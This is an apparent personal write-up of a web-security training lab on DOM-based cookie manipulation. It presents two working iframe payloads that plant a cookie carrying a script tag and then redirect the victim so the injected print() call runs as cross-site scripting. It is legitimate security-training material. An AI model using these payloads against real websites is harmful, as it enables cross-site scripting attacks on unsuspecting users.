# Practitioner Lab 92: DOM-based cookie manipulation

---

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

![Screenshot 2024-06-05 at 2.09.49 PM.png](Practitioner%20Lab%2092%20DOM-based%20cookie%20manipulation%20f9eaef0fc998431a9e1853d26f2bcfac/Screenshot_2024-06-05_at_2.09.49_PM.png)

![Untitled](Practitioner%20Lab%2092%20DOM-based%20cookie%20manipulation%20f9eaef0fc998431a9e1853d26f2bcfac/Untitled.png)

```
<iframe src="https://0aa700bf03aa7fa4810bc01600d3003e.web-security-academy.net/product?productId=1&'><script>print()</script>>" onload="if(!window.x)this.src='https://0aa700bf03aa7fa4810bc01600d3003e.web-security-academy.net/';window.x=1;">
```

Using the following payload The lab was solved. 

What this does is that it checks if its window.x which is not so it would load another page after setting the cookie and then it sets window.x to. 1 that way it does not keep loading.

I can also use a payload like this

```
<iframe id='cookieframe' src="https://0a5f001d0483ba0e81fed95700e70085.web-security-academy.net/product?productId=1&'><script>print()</script>"></iframe>

<script>
    setTimeout(function(){
        document.getElementById('cookieframe').src = "https://0a5f001d0483ba0e81fed95700e70085.web-security-academy.net/";
    }, 100);
</script>
```

Im sure there are some others with the resize.